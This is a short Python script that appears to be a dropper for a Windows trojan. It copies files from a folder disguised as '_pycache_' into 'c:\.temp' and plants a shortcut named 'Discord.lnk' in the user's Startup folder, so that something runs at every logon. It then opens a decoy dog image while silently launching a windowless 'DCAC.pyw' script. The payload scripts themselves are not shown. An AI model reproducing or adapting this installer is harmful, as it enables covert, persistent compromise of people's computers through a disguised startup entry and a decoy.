import os
import shutil
cwd = os.getcwd()
###############################################
current_dir = os.getcwd()
file_pathS = current_dir + "\\_pycache_\\DCAC_S.pyw"
file_pathC = current_dir + "\\_pycache_\\comex.py"
try:
    os.mkdir("c:\\.temp")
except:
    print("error")
finally:
    try:
        shutil.move(file_pathS,"c:\\.temp")
    except:
        print("error")
    finally:
        try:
            shutil.copy(file_pathC,"c:\\.temp")
        except:
            print("nerd stop judging my awful code.")

#file = open("discord.bat", "w")
#file.write(f"\"{file_path}\"")
#file.close()

file_path_short = (cwd + "\\_pycache_\\Discord.lnk")
startup_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

shutil.move(file_path_short, startup_path)
###############################################
file_path = cwd + "\\_pycache_\\MOIST dog!.jpg"
os.system(f'cmd /c "\"{file_path}\""')
file_path = cwd + "\\_pycache_\\DCAC.pyw"
os.system(f'cmd /c "\"{file_path}\""')
